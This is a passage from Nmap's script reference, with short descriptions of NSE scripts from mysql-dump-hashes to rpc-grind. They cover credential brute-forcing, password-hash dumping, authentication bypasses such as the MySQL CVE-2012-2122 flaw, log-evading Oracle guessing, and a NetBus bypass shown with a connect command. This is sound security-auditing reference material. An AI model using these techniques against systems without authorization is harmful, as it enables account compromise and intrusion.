  Dumps the password hashes from an MySQL server in a format suitable for
  cracking by tools such as John the Ripper.  Appropriate DB privileges (root) are required.

  The <code>username</code> and <code>password</code> arguments take precedence
  over credentials discovered by the mysql-brute and mysql-empty-password
  scripts.

mysql-empty-password
Categories: intrusive auth
https://nmap.org/nsedoc/scripts/mysql-empty-password.html
  Checks for MySQL servers with an empty password for <code>root</code> or
  <code>anonymous</code>.

mysql-enum
Categories: intrusive brute
https://nmap.org/nsedoc/scripts/mysql-enum.html
  Performs valid-user enumeration against MySQL server using a bug
  discovered and published by Kingcope
  (http://seclists.org/fulldisclosure/2012/Dec/9).

  Server version 5.x are susceptible to an user enumeration
  attack due to different messages during login when using
  old authentication mechanism from versions 4.x and earlier.


mysql-info
Categories: default discovery safe
https://nmap.org/nsedoc/scripts/mysql-info.html
  Connects to a MySQL server and prints information such as the protocol and
  version numbers, thread ID, status, capabilities, and the password salt.

  If service detection is performed and the server appears to be blocking
  our host or is blocked because of too many connections, then this script
  isn't run (see the portrule).

mysql-query
Categories: auth discovery safe
https://nmap.org/nsedoc/scripts/mysql-query.html
  Runs a query against a MySQL database and returns the results as a table.

mysql-users
Categories: auth intrusive
https://nmap.org/nsedoc/scripts/mysql-users.html
  Attempts to list all users on a MySQL server.

mysql-variables
Categories: discovery intrusive
https://nmap.org/nsedoc/scripts/mysql-variables.html
  Attempts to show all variables on a MySQL server.

mysql-vuln-cve2012-2122
Categories: discovery intrusive vuln
https://nmap.org/nsedoc/scripts/mysql-vuln-cve2012-2122.html

  Attempts to bypass authentication in MySQL and MariaDB servers by
  exploiting CVE2012-2122. If its vulnerable, it will also attempt to
  dump the MySQL usernames and password hashes.

  All MariaDB and MySQL versions up to 5.1.61, 5.2.11, 5.3.5, 5.5.22 are
  vulnerable but exploitation depends on whether memcmp() returns an
  arbitrary integer outside of -128..127 range.

  "When a user connects to MariaDB/MySQL, a token (SHA over a password
  and a random scramble string) is calculated and compared with the
  expected value. Because of incorrect casting, it might've happened
  that the token and the expected value were considered equal, even if
  the memcmp() returned a non-zero value. In this case MySQL/MariaDB
  would think that the password is correct, even while it is not.
  Because the protocol uses random strings, the probability of hitting
  this bug is about 1/256.  Which means, if one knows a user name to
  connect (and "root" almost always exists), she can connect using *any*
  password by repeating connection attempts. ~300 attempts takes only a
  fraction of second, so basically account password protection is as
  good as nonexistent."

  Original public advisory:
  * http://seclists.org/oss-sec/2012/q2/493
  Interesting post about this vuln:
  * https://community.rapid7.com/community/metasploit/blog/2012/06/11/cve-2012-2122-a-tragically-comedic-security-flaw-in-mysql

nat-pmp-info
Categories: default discovery safe
https://nmap.org/nsedoc/scripts/nat-pmp-info.html
  Gets the routers WAN IP using the NAT Port Mapping Protocol (NAT-PMP).
  The NAT-PMP protocol is supported by a broad range of routers including:
  * Apple AirPort Express
  * Apple AirPort Extreme
  * Apple Time Capsule
  * DD-WRT
  * OpenWrt v8.09 or higher, with MiniUPnP daemon
  * pfSense v2.0
  * Tarifa (firmware) (Linksys WRT54G/GL/GS)
  * Tomato Firmware v1.24 or higher. (Linksys WRT54G/GL/GS and many more)
  * Peplink Balance

nat-pmp-mapport
Categories: discovery safe
https://nmap.org/nsedoc/scripts/nat-pmp-mapport.html
  Maps a WAN port on the router to a local port on the client using the NAT Port Mapping Protocol (NAT-PMP).  It supports the following operations:
  * map - maps a new external port on the router to an internal port of the requesting IP
  * unmap - unmaps a previously mapped port for the requesting IP
  * unmapall - unmaps all previously mapped ports for the requesting IP

nbd-info
Categories: discovery intrusive
https://nmap.org/nsedoc/scripts/nbd-info.html
  Displays protocol and block device information from NBD servers.

  The Network Block Device protocol is used to publish block devices
  over TCP. This script connects to an NBD server and attempts to pull
  down a list of exported block devices and their details

  For additional information:
  * https://github.com/NetworkBlockDevice/nbd/blob/master/doc/proto.md

nbns-interfaces
Categories: default discovery safe
https://nmap.org/nsedoc/scripts/nbns-interfaces.html
  Retrieves IP addresses of the target's network interfaces via NetBIOS NS.
  Additional network interfaces may reveal more information about the target,
  including finding paths to hidden non-routed networks via multihomed systems.

nbstat
Categories: default discovery safe
https://nmap.org/nsedoc/scripts/nbstat.html
  Attempts to retrieve the target's NetBIOS names and MAC address.

  By default, the script displays the name of the computer and the logged-in
  user; if the verbosity is turned up, it displays all names the system thinks it
  owns.

ncp-enum-users
Categories: auth safe
https://nmap.org/nsedoc/scripts/ncp-enum-users.html
  Retrieves a list of all eDirectory users from the Novell NetWare Core Protocol (NCP) service.

ncp-serverinfo
Categories: default discovery safe
https://nmap.org/nsedoc/scripts/ncp-serverinfo.html
  Retrieves eDirectory server information (OS version, server name,
  mounts, etc.) from the Novell NetWare Core Protocol (NCP) service.

ndmp-fs-info
Categories: discovery safe
https://nmap.org/nsedoc/scripts/ndmp-fs-info.html
  Lists remote file systems by querying the remote device using the Network
  Data Management Protocol (ndmp). NDMP is a protocol intended to transport
  data between a NAS device and the backup device, removing the need for the
  data to pass through the backup server. The following products are known
  to support the protocol:
  * Amanda
  * Bacula
  * CA Arcserve
  * CommVault Simpana
  * EMC Networker
  * Hitachi Data Systems
  * IBM Tivoli
  * Quest Software Netvault Backup
  * Symantec Netbackup
  * Symantec Backup Exec

ndmp-version
Categories: version
https://nmap.org/nsedoc/scripts/ndmp-version.html
  Retrieves version information from the remote Network Data Management Protocol
  (ndmp) service. NDMP is a protocol intended to transport data between a NAS
  device and the backup device, removing the need for the data to pass through
  the backup server. The following products are known to support the protocol:
  * Amanda
  * Bacula
  * CA Arcserve
  * CommVault Simpana
  * EMC Networker
  * Hitachi Data Systems
  * IBM Tivoli
  * Quest Software Netvault Backup
  * Symantec Netbackup
  * Symantec Backup Exec

nessus-brute
Categories: intrusive brute
https://nmap.org/nsedoc/scripts/nessus-brute.html
  Performs brute force password auditing against a Nessus vulnerability scanning daemon using the NTP 1.2 protocol.

nessus-xmlrpc-brute
Categories: intrusive brute
https://nmap.org/nsedoc/scripts/nessus-xmlrpc-brute.html
  Performs brute force password auditing against a Nessus vulnerability scanning daemon using the XMLRPC protocol.

netbus-auth-bypass
Categories: auth safe vuln
https://nmap.org/nsedoc/scripts/netbus-auth-bypass.html
  Checks if a NetBus server is vulnerable to an authentication bypass
  vulnerability which allows full access without knowing the password.

  For example a server running on TCP port 12345 on localhost with
  this vulnerability is accessible to anyone. An attacker could
  simply form a connection to the server ( ncat -C 127.0.0.1 12345 )
  and login to the service by typing Password;1; into the console.

netbus-brute
Categories: brute intrusive
https://nmap.org/nsedoc/scripts/netbus-brute.html
  Performs brute force password auditing against the Netbus backdoor ("remote administration") service.

netbus-info
Categories: default discovery safe
https://nmap.org/nsedoc/scripts/netbus-info.html
  Opens a connection to a NetBus server and extracts information about
  the host and the NetBus service itself.

  The extracted host information includes a list of running
  applications, and the hosts sound volume settings.

  The extracted service information includes its access control list
  (acl), server information, and setup. The acl is a list of IP
  addresses permitted to access the service. Server information
  contains details about the server installation path, restart
  persistence, user account that the server is running on, and the
  amount of connected NetBus clients. The setup information contains
  configuration details, such as the services TCP port number, traffic
  logging setting, password, an email address for receiving login
  notifications, an email address used for sending the notifications,
  and an smtp-server used for notification delivery.

netbus-version
Categories: version
https://nmap.org/nsedoc/scripts/netbus-version.html
  Extends version detection to detect NetBuster, a honeypot service
  that mimes NetBus.

nexpose-brute
Categories: intrusive brute
https://nmap.org/nsedoc/scripts/nexpose-brute.html
  Performs brute force password auditing against a Nexpose vulnerability scanner
  using the API 1.1.

  As the Nexpose application enforces account lockout after 4 incorrect login
  attempts, the script performs only 3 guesses per default. This can be
  altered by supplying the <code>brute.guesses</code> argument a different
  value or 0 (zero) to guess the whole dictionary.

nfs-ls
Categories: discovery safe
https://nmap.org/nsedoc/scripts/nfs-ls.html
  Attempts to get useful information about files from NFS exports.
  The output is intended to resemble the output of <code>ls</code>.

  The script starts by enumerating and mounting the remote NFS exports. After
  that it performs an NFS GETATTR procedure call for each mounted point
  in order to get its ACLs.
  For each mounted directory the script will try to list its file entries
  with their attributes.

  Since the file attributes shown in the results are the result of
  GETATTR, READDIRPLUS, and similar procedures, the attributes
  are the attributes of the local filesystem.

  These access permissions are shown only with NFSv3:
  * Read:     Read data from file or read a directory.
  * Lookup:   Look up a name in a directory
              (no meaning for non-directory objects).
  * Modify:   Rewrite existing file data or modify existing
              directory entries.
  * Extend:   Write new data or add directory entries.
  * Delete:   Delete an existing directory entry.
  * Execute:  Execute file (no meaning for a directory).

  Recursive listing is not implemented.

nfs-showmount
Categories: discovery safe
https://nmap.org/nsedoc/scripts/nfs-showmount.html
  Shows NFS exports, like the <code>showmount -e</code> command.

nfs-statfs
Categories: discovery safe
https://nmap.org/nsedoc/scripts/nfs-statfs.html
  Retrieves disk space statistics and information from a remote NFS share.
  The output is intended to resemble the output of <code>df</code>.

  The script will provide pathconf information of the remote NFS if
  the version used is NFSv3.

nje-node-brute
Categories: intrusive brute
https://nmap.org/nsedoc/scripts/nje-node-brute.html
  z/OS JES Network Job Entry (NJE) target node name brute force.

  NJE node communication is made up of an OHOST and an RHOST. Both fields
  must be present when conducting the handshake. This script attemtps to
  determine the target systems NJE node name.

  To initiate NJE the client sends a 33 byte record containing the type of
  record, the hostname (RHOST), IP address (RIP), target (OHOST),
  target IP (OIP) and a 1 byte response value (R) as outlined below:

  <code>
  0 1 2 3 4 5 6 7 8 9 A B C D E F
  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
  |  TYPE       |     RHOST     |
  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
  |  RIP  |  OHOST      | OIP   |
  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
  | R |
  +-+-+
  </code>

  * TYPE: Can either be 'OPEN', 'ACK', or 'NAK', in EBCDIC, padded by spaces to make 8 bytes. This script always send 'OPEN' type.
  * RHOST: Node name of the local machine initiating the connection. Set to 'FAKE'.
  * RIP: Hex value of the local systems IP address. Set to '0.0.0.0'
  * OHOST: The value being enumerated to determine the targets NJE node name.
  * OIP: IP address, in hex, of the target system. Set to '0.0.0.0'.
  * R: The response. NJE will send an 'R' of 0x01 if the OHOST is wrong or 0x04 if the OHOST is correct.

  By default this script will attempt the brute force a mainframes OHOST. If supplied with
  the argument <code>nje-node-brute.ohost</code> this script will attempt the bruteforce
  the RHOST, setting OHOST to the value supplied to the argument.

  Since most systems will only have one OHOST name, it is recommended to use the
  <code>brute.firstonly</code> script argument.

nje-pass-brute
Categories: intrusive brute
https://nmap.org/nsedoc/scripts/nje-pass-brute.html
  z/OS JES Network Job Entry (NJE) 'I record' password brute forcer.

  After successfully negotiating an OPEN connection request, NJE requires sending,
  what IBM calls, an 'I record'. This initialization record may sometimes require
  a password. This script, provided with a valid OHOST/RHOST for the NJE connection,
  brute forces the password.

  Most systems only have one password, it is recommended to use the
  <code>brute.firstonly</code> script argument.

nntp-ntlm-info
Categories: default discovery safe
https://nmap.org/nsedoc/scripts/nntp-ntlm-info.html
  This script enumerates information from remote NNTP services with NTLM
  authentication enabled.

  Sending an MS-NNTP NTLM authentication request with null credentials will
  cause the remote service to respond with a NTLMSSP message disclosing
  information to include NetBIOS, DNS, and OS build version.

nping-brute
Categories: brute intrusive
https://nmap.org/nsedoc/scripts/nping-brute.html
  Performs brute force password auditing against an Nping Echo service.

  See https://nmap.org/book/nping-man-echo-mode.html for Echo Mode
  documentation.

nrpe-enum
Categories: discovery intrusive
https://nmap.org/nsedoc/scripts/nrpe-enum.html
  Queries Nagios Remote Plugin Executor (NRPE) daemons to obtain information such
  as load averages, process counts, logged in user information, etc.

  This script attempts to execute the stock list of commands that are
  enabled. User-supplied arguments are not supported.

ntp-info
Categories: default discovery safe
https://nmap.org/nsedoc/scripts/ntp-info.html
  Gets the time and configuration variables from an NTP server. We send two
  requests: a time request and a "read variables" (opcode 2) control message.
  Without verbosity, the script shows the time and the value of the
  <code>version</code>, <code>processor</code>, <code>system</code>,
  <code>refid</code>, and <code>stratum</code> variables. With verbosity, all
  variables are shown.

  See RFC 1035 and the Network Time Protocol Version 4 Reference and
  Implementation Guide
  (http://www.eecis.udel.edu/~mills/database/reports/ntp4/ntp4.pdf) for
  documentation of the protocol.

ntp-monlist
Categories: discovery intrusive
https://nmap.org/nsedoc/scripts/ntp-monlist.html
  Obtains and prints an NTP server's monitor data.

  Monitor data is a list of the most recently used (MRU) having NTP associations
  with the target. Each record contains information about the most recent NTP
  packet sent by a host to the target including the source and destination
  addresses and the NTP version and mode of the packet. With this information it
  is possible to classify associated hosts as Servers, Peers, and Clients.

  A Peers command is also sent to the target and the peers list in the response
  allows differentiation between configured Mode 1 Peers and clients which act
  like Peers (such as the Windows W32Time service).

  Associated hosts are further classified as either public or private.
  Private hosts are those
  having IP addresses which are not routable on the public Internet and thus can
  help to form a picture about the topology of the private network on which the
  target resides.

  Other information revealed by the monlist and peers commands are the host with
  which the target clock is synchronized and hosts which send Control Mode (6)
  and Private Mode (7) commands to the target and which may be used by admins for
  the NTP service.

  It should be noted that the very nature of the NTP monitor data means that the
  Mode 7 commands sent by this script are recorded by the target (and will often
  appear in these results). Since the monitor data is a MRU list, it is probable
  that you can overwrite the record of the Mode 7 command by sending an innocuous
  looking Client Mode request. This can be achieved easily using Nmap:
  <code>nmap -sU -pU:123 -Pn -n --max-retries=0 <target></code>

  Notes:
  * The monitor list in response to the monlist command is limited to 600 associations.
  * The monitor capability may not be enabled on the target in which case you may receive an error number 4 (No Data Available).
  * There may be a restriction on who can perform Mode 7 commands (e.g. "restrict noquery" in <code>ntp.conf</code>) in which case you may not receive a reply.
  * This script does not handle authenticating and targets expecting auth info may respond with error number 3 (Format Error).

omp2-brute
Categories: brute intrusive
https://nmap.org/nsedoc/scripts/omp2-brute.html
  Performs brute force password auditing against the OpenVAS manager using OMPv2.

omp2-enum-targets
Categories: discovery safe
https://nmap.org/nsedoc/scripts/omp2-enum-targets.html
  Attempts to retrieve the list of target systems and networks from an OpenVAS Manager server.

  The script authenticates on the manager using provided or previously cracked
  credentials and gets the list of defined targets for each account.

  These targets will be added to the scanning queue in case
  <code>newtargets</code> global variable is set.

omron-info
Categories: discovery version
https://nmap.org/nsedoc/scripts/omron-info.html
  This NSE script is used to send a FINS packet to a remote device. The script
  will send a Controller Data Read Command and once a response is received, it
  validates that it was a proper response to the command that was sent, and then
  will parse out the data.

openflow-info
Categories: default safe
https://nmap.org/nsedoc/scripts/openflow-info.html
  Queries OpenFlow controllers for information. Newer versions of the OpenFlow
  protocol (1.3 and greater) will return a list of all protocol versions supported
  by the controller. Versions prior to 1.3 only return their own version number.

  For additional information:
  * https://www.opennetworking.org/images/stories/downloads/sdn-resources/onf-specifications/openflow/openflow-switch-v1.5.0.noipr.pdf

openlookup-info
Categories: default discovery safe version
https://nmap.org/nsedoc/scripts/openlookup-info.html
  Parses and displays the banner information of an OpenLookup (network key-value store) server.

openvas-otp-brute
Categories: intrusive brute
https://nmap.org/nsedoc/scripts/openvas-otp-brute.html
  Performs brute force password auditing against a OpenVAS vulnerability scanner daemon using the OTP 1.0 protocol.

openwebnet-discovery
Categories: discovery safe
https://nmap.org/nsedoc/scripts/openwebnet-discovery.html
  OpenWebNet is a communications protocol developed by Bticino since 2000.
  Retrieves device identifying information and number of connected devices.

  References:
  * https://www.myopen-legrandgroup.com/solution-gallery/openwebnet/
  * http://www.pimyhome.org/wiki/index.php/OWN_OpenWebNet_Language_Reference

oracle-brute-stealth
Categories: intrusive brute
https://nmap.org/nsedoc/scripts/oracle-brute-stealth.html
  Exploits the CVE-2012-3137 vulnerability, a weakness in Oracle's
  O5LOGIN authentication scheme.  The vulnerability exists in Oracle 11g
  R1/R2 and allows linking the session key to a password hash.  When
  initiating an authentication attempt as a valid user the server will
  respond with a session key and salt.  Once received the script will
  disconnect the connection thereby not recording the login attempt.
  The session key and salt can then be used to brute force the users
  password.

oracle-brute
Categories: intrusive brute
https://nmap.org/nsedoc/scripts/oracle-brute.html
  Performs brute force password auditing against Oracle servers.

  Running it in default mode it performs an audit against a list of common
  Oracle usernames and passwords. The mode can be changed by supplying the
  argument oracle-brute.nodefault at which point the script will use the
  username- and password- lists supplied with Nmap. Custom username- and
  password- lists may be supplied using the userdb and passdb arguments.
  The default credential list can be changed too by using the brute.credfile
  argument. In case the userdb or passdb arguments are supplied, the script
  assumes that it should run in the nodefault mode.

  In modern versions of Oracle password guessing speeds decrease after a few
  guesses and remain slow, due to connection throttling.

  WARNING: The script makes no attempt to discover the amount of guesses
  that can be made before locking an account. Running this script may therefor
  result in a large number of accounts being locked out on the database server.

oracle-enum-users
Categories: intrusive auth
https://nmap.org/nsedoc/scripts/oracle-enum-users.html
  Attempts to enumerate valid Oracle user names against unpatched Oracle 11g
  servers (this bug was fixed in Oracle's October 2009 Critical Patch Update).

oracle-sid-brute
Categories: intrusive brute
https://nmap.org/nsedoc/scripts/oracle-sid-brute.html
  Guesses Oracle instance/SID names against the TNS-listener.

  If the <code>oraclesids</code> script argument is not used to specify an
  alternate file, the default <code>oracle-sids</code> file will be used.
  License to use the <code>oracle-sids</code> file was granted by its
  author, Alexander Kornbrust (http://seclists.org/nmap-dev/2009/q4/645).

oracle-tns-version
Categories: version safe
https://nmap.org/nsedoc/scripts/oracle-tns-version.html
  Decodes the VSNNUM version number from an Oracle TNS listener.

ovs-agent-version
Categories: version
https://nmap.org/nsedoc/scripts/ovs-agent-version.html
  Detects the version of an Oracle Virtual Server Agent by fingerprinting
  responses to an HTTP GET request and an XML-RPC method call.

  Version 2.2 of Virtual Server Agent returns a distinctive string in response to an
  HTTP GET request. However versions 3.0 and 3.0.1 return a generic response that
  looks like any other BaseHTTP/SimpleXMLRPCServer. Versions 2.2 and 3.0 return a
  distinctive error message in response to a <code>system.listMethods</code>
  XML-RPC call, which however does not distinguish the two versions. Version 3.0.1
  returns a response to <code>system.listMethods</code> that is different from
  that of both version 2.2 and 3.0. Therefore we use this strategy: (1.) Send a
  GET request. If the version 2.2 string is returned, return "2.2". (2.) Send a
  <code>system.listMethods</code> method call. If an error is
  returned, return "3.0" or "3.0.1", depending on the specific format of the
  error.

p2p-conficker
Categories: default safe
https://nmap.org/nsedoc/scripts/p2p-conficker.html
  Checks if a host is infected with Conficker.C or higher, based on
  Conficker's peer to peer communication.

  When Conficker.C or higher infects a system, it opens four ports: two TCP
  and two UDP. The ports are random, but are seeded with the current week and
  the IP of the infected host. By determining the algorithm, one can check if
  these four ports are open, and can probe them for more data.

  Once the open ports are found, communication can be initiated using
  Conficker's custom peer to peer protocol.  If a valid response is received,
  then a valid Conficker infection has been found.

  This check won't work properly on a multihomed or NATed system because the
  open ports will be based on a nonpublic IP.  The argument
  <code>checkall</code> tells Nmap to attempt communication with every open
  port (much like a version check) and the argument <code>realip</code> tells
  Nmap to base its port generation on the given IP address instead of the
  actual IP.

  By default, this will run against a system that has a standard Windows port
  open (445, 139, 137). The arguments <code>checkall</code> and
  <code>checkconficker</code> will both perform checks regardless of which
  port is open, see the args section for more information.

  Note: Ensure your clock is correct (within a week) before using this script!

  The majority of research for this script was done by Symantec Security
  Response, and some was taken from public sources (most notably the port
  blacklisting was found by David Fifield). A big thanks goes out to everybody
  who contributed!

path-mtu
Categories: safe discovery
https://nmap.org/nsedoc/scripts/path-mtu.html
  Performs simple Path MTU Discovery to target hosts.

  TCP or UDP packets are sent to the host with the DF (don't fragment) bit set
  and with varying amounts of data.  If an ICMP Fragmentation Needed is received,
  or no reply is received after retransmissions, the amount of data is lowered
  and another packet is sent.  This continues until (assuming no errors occur) a
  reply from the final host is received, indicating the packet reached the host
  without being fragmented.

  Not all MTUs are attempted so as to not expend too much time or network
  resources.  Currently the relatively short list of MTUs to try contains
  the plateau values from Table 7-1 in RFC 1191, "Path MTU Discovery".
  Using these values significantly cuts down the MTU search space.  On top
  of that, this list is rarely traversed in whole because:
  * the MTU of the outgoing interface is used as a starting point, and
  * we can jump down the list when an intermediate router sending a "can't fragment" message includes its next hop MTU (as described in RFC 1191 and required by RFC 1812)

pcanywhere-brute
Categories: intrusive brute
https://nmap.org/nsedoc/scripts/pcanywhere-brute.html
  Performs brute force password auditing against the pcAnywhere remote access protocol.

  Due to certain limitations of the protocol, bruteforcing
  is limited to single thread at a time.
  After a valid login pair is guessed the script waits
  some time until server becomes available again.


pcworx-info
Categories: discovery
https://nmap.org/nsedoc/scripts/pcworx-info.html
  This NSE script will query and parse pcworx protocol to a remote PLC.
  The script will send a initial request packets and once a response is received,
  it validates that it was a proper response to the command that was sent, and then
  will parse out the data. PCWorx is a protocol and Program by Phoenix Contact.


  http://digitalbond.com

pgsql-brute
Categories: intrusive brute
https://nmap.org/nsedoc/scripts/pgsql-brute.html
  Performs password guessing against PostgreSQL.

pjl-ready-message
Categories: intrusive
https://nmap.org/nsedoc/scripts/pjl-ready-message.html
  Retrieves or sets the ready message on printers that support the Printer
  Job Language. This includes most PostScript printers that listen on port
  9100. Without an argument, displays the current ready message. With the
  <code>pjl_ready_message</code> script argument, displays the old ready
  message and changes it to the message given.

pop3-brute
Categories: intrusive brute
https://nmap.org/nsedoc/scripts/pop3-brute.html
  Tries to log into a POP3 account by guessing usernames and passwords.

pop3-capabilities
Categories: default discovery safe
https://nmap.org/nsedoc/scripts/pop3-capabilities.html
  Retrieves POP3 email server capabilities.

  POP3 capabilities are defined in RFC 2449. The CAPA command allows a client to
  ask a server what commands it supports and possibly any site-specific policy.
  Besides the list of supported commands, the IMPLEMENTATION string giving the
  server version may be available.

pop3-ntlm-info
Categories: default discovery safe
https://nmap.org/nsedoc/scripts/pop3-ntlm-info.html
  This script enumerates information from remote POP3 services with NTLM
  authentication enabled.

  Sending a POP3 NTLM authentication request with null credentials will
  cause the remote service to respond with a NTLMSSP message disclosing
  information to include NetBIOS, DNS, and OS build version.

port-states
Categories: safe
https://nmap.org/nsedoc/scripts/port-states.html
  Prints a list of ports found in each state.

  Nmap ordinarily summarizes "uninteresting" ports as "Not shown: 94 closed
  ports, 4 filtered ports" but users may want to know which ports were filtered
  vs which were closed. This script will expand these summaries into a list of
  ports and port ranges that were found in each state.

pptp-version
Categories: version
https://nmap.org/nsedoc/scripts/pptp-version.html
  Attempts to extract system information from the point-to-point tunneling protocol (PPTP) service.

puppet-naivesigning
Categories: intrusive vuln
https://nmap.org/nsedoc/scripts/puppet-naivesigning.html
  Detects if naive signing is enabled on a Puppet server. This enables attackers
  to create any Certificate Signing Request and have it signed, allowing them
  to impersonate as a puppet agent. This can leak the configuration of the agents
  as well as any other sensitive information found in the configuration files.

  This script makes use of the Puppet HTTP API interface to sign the request.

  This script has been Tested on versions 3.8.5, 4.10.

  References:
  * https://docs.puppet.com/puppet/4.10/ssl_autosign.html#security-implications-of-nave-autosigning

qconn-exec
Categories: intrusive exploit vuln
https://nmap.org/nsedoc/scripts/qconn-exec.html
  Attempts to identify whether a listening QNX QCONN daemon allows
  unauthenticated users to execute arbitrary operating system commands.

  QNX is a commercial Unix-like real-time operating system, aimed primarily at
  the embedded systems market. The QCONN daemon is a service provider that
  provides support, such as profiling system information, to remote IDE
  components. The QCONN daemon runs on port 8000 by default.

  For more information about QNX QCONN, see:
  * http://www.qnx.com/developers/docs/6.3.0SP3/neutrino/utilities/q/qconn.html
  * http://www.fishnetsecurity.com/6labs/blog/pentesting-qnx-neutrino-rtos
  * http://www.exploit-db.com/exploits/21520
  * http://metasploit.org/modules/exploit/unix/misc/qnx_qconn_exec

qscan
Categories: safe discovery
https://nmap.org/nsedoc/scripts/qscan.html
  Repeatedly probe open and/or closed ports on a host to obtain a series
  of round-trip time values for each port.  These values are used to
  group collections of ports which are statistically different from other
  groups.  Ports being in different groups (or "families") may be due to
  network mechanisms such as port forwarding to machines behind a NAT.

  In order to group these ports into different families, some statistical
  values must be computed.  Among these values are the mean and standard
  deviation of the round-trip times for each port.  Once all of the times
  have been recorded and these values have been computed, the Student's
  t-test is used to test the statistical significance of the differences
  between each port's data.  Ports which have round-trip times that are
  statistically the same are grouped together in the same family.

  This script is based on Doug Hoyte's Qscan documentation and patches
  for Nmap.

quake1-info
Categories: default discovery safe version
https://nmap.org/nsedoc/scripts/quake1-info.html
  Extracts information from Quake game servers and other game servers
  which use the same protocol.

  Quake uses UDP packets, which because of source spoofing can be used to amplify
  a denial-of-service attack. For each request, the script reports the payload
  amplification as a ratio. The format used is
  <code>response_bytes/request_bytes=ratio</code>

  http://www.gamers.org/dEngine/quake/QDP/qnp.html

quake3-info
Categories: default discovery safe version
https://nmap.org/nsedoc/scripts/quake3-info.html
  Extracts information from a Quake3 game server and other games which use the same protocol.

quake3-master-getservers
Categories: default discovery safe
https://nmap.org/nsedoc/scripts/quake3-master-getservers.html
  Queries Quake3-style master servers for game servers (many games other than Quake 3 use this same protocol).

rdp-enum-encryption
Categories: safe discovery
https://nmap.org/nsedoc/scripts/rdp-enum-encryption.html
  Determines which Security layer and Encryption level is supported by the
  RDP service. It does so by cycling through all existing protocols and ciphers.
  When run in debug mode, the script also returns the protocols and ciphers that
  fail and any errors that were reported.

  The script was inspired by MWR's RDP Cipher Checker
  http://labs.mwrinfosecurity.com/tools/2009/01/12/rdp-cipher-checker/

rdp-ntlm-info
Categories: default discovery safe
https://nmap.org/nsedoc/scripts/rdp-ntlm-info.html
  This script enumerates information from remote RDP services with CredSSP
  (NLA) authentication enabled.

  Sending an incomplete CredSSP (NTLM) authentication request with null credentials
  will cause the remote service to respond with a NTLMSSP message disclosing
  information to include NetBIOS, DNS, and OS build version.

rdp-vuln-ms12-020
Categories: intrusive vuln
https://nmap.org/nsedoc/scripts/rdp-vuln-ms12-020.html
  Checks if a machine is vulnerable to MS12-020 RDP vulnerability.

  The Microsoft bulletin MS12-020 patches two vulnerabilities: CVE-2012-0152
  which addresses a denial of service vulnerability inside Terminal Server, and
  CVE-2012-0002 which fixes a vulnerability in Remote Desktop Protocol. Both are
  part of Remote Desktop Services.

  The script works by checking for the CVE-2012-0152 vulnerability. If this
  vulnerability is not patched, it is assumed that CVE-2012-0002 is not patched
  either. This script can do its check without crashing the target.

  The way this works follows:
  * Send one user request. The server replies with a user id (call it A) and a channel for that user.
  * Send another user request. The server replies with another user id (call it B) and another channel.
  * Send a channel join request with requesting user set to A and requesting channel set to B. If the server replies with a success message, we conclude that the server is vulnerable.
  * In case the server is vulnerable, send a channel join request with the requesting user set to B and requesting channel set to B to prevent the chance of a crash.

  References:
  * http://technet.microsoft.com/en-us/security/bulletin/ms12-020
  * http://support.microsoft.com/kb/2621440
  * http://zerodayinitiative.com/advisories/ZDI-12-044/
  * http://aluigi.org/adv/termdd_1-adv.txt

  Original check by by Worawit Wang (sleepya).

realvnc-auth-bypass
Categories: auth safe vuln
https://nmap.org/nsedoc/scripts/realvnc-auth-bypass.html
  Checks if a VNC server is vulnerable to the RealVNC authentication bypass
  (CVE-2006-2369).

redis-brute
Categories: intrusive brute
https://nmap.org/nsedoc/scripts/redis-brute.html
  Performs brute force passwords auditing against a Redis key-value store.

redis-info
Categories: discovery safe
https://nmap.org/nsedoc/scripts/redis-info.html
  Retrieves information (such as version number and architecture) from a Redis key-value store.

resolveall
Categories: safe discovery
https://nmap.org/nsedoc/scripts/resolveall.html
  NOTE: This script has been replaced by the <code>--resolve-all</code>
  command-line option in Nmap 7.70

  Resolves hostnames and adds every address (IPv4 or IPv6, depending on
  Nmap mode) to Nmap's target list.  This differs from Nmap's normal
  host resolution process, which only scans the first address (A or AAAA
  record) returned for each host name.

  The script will run on any target provided by hostname. It can also be fed
  hostnames via the <code>resolveall.hosts</code> argument. Because it adds new
  targets by IP address it will not run recursively, since those new targets were
  not provided by hostname. It will also not add the same IP that was initially
  chosen for scanning by Nmap.

reverse-index
Categories: safe
https://nmap.org/nsedoc/scripts/reverse-index.html
  Creates a reverse index at the end of scan output showing which hosts run a
  particular service.  This is in addition to Nmap's normal output listing the
  services on each host.

rexec-brute
Categories: brute intrusive
https://nmap.org/nsedoc/scripts/rexec-brute.html
  Performs brute force password auditing against the classic UNIX rexec (remote exec) service.

rfc868-time
Categories: discovery safe version
https://nmap.org/nsedoc/scripts/rfc868-time.html
  Retrieves the day and time from the Time service.

riak-http-info
Categories: discovery safe
https://nmap.org/nsedoc/scripts/riak-http-info.html
  Retrieves information (such as node name and architecture) from a Basho Riak distributed database using the HTTP protocol.

rlogin-brute
Categories: brute intrusive
https://nmap.org/nsedoc/scripts/rlogin-brute.html
  Performs brute force password auditing against the classic UNIX rlogin (remote
  login) service.  This script must be run in privileged mode on UNIX because it
  must bind to a low source port number.

rmi-dumpregistry
Categories: default discovery safe
https://nmap.org/nsedoc/scripts/rmi-dumpregistry.html
  Connects to a remote RMI registry and attempts to dump all of its
  objects.

  First it tries to determine the names of all objects bound in the
  registry, and then it tries to determine information about the
  objects, such as the the class names of the superclasses and
  interfaces. This may, depending on what the registry is used for, give
  valuable information about the service. E.g, if the app uses JMX (Java
  Management eXtensions), you should see an object called "jmxconnector"
  on it.

  It also gives information about where the objects are located, (marked
  with @<ip>:port in the output).

  Some apps give away the classpath, which this scripts catches in
  so-called "Custom data".

rmi-vuln-classloader
Categories: intrusive vuln
https://nmap.org/nsedoc/scripts/rmi-vuln-classloader.html
  Tests whether Java rmiregistry allows class loading.  The default
  configuration of rmiregistry allows loading classes from remote URLs,
  which can lead to remote code execution. The vendor (Oracle/Sun)
  classifies this as a design feature.


  Based on original Metasploit module by mihi.

  References:
  * https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/misc/java_rmi_server.rb

rpc-grind
Categories: version
https://nmap.org/nsedoc/scripts/rpc-grind.html
  Fingerprints the target RPC port to extract the target service, RPC number and version.

  The script works by sending RPC Null call requests with a random high version
  unsupported number to the target service with iterated over RPC program numbers
  from the nmap-rpc file and check for replies from the target port.
  A reply with a RPC accept state 2 (Remote can't support version) means that we
